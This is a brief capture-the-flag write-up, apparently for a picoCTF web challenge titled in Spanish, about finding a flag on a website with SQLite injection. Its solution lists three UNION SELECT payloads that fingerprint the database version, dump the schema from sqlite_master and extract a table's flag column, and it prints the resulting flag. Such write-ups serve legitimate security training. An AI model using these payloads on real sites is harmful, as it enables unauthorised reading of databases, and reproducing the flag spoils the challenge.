## Descripción 
Can you find the flag on this website.

Additional details will be available after launching your challenge instance.
## Hints
1. SQLiLite
## Solución
```
' union select sqlite_version(),2,3;

' union select sql,2,3 from sqlite_master;

' union select id,flag,3 from more_table
|   |
|---|
|picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}|

```
## Notas

## Referencias
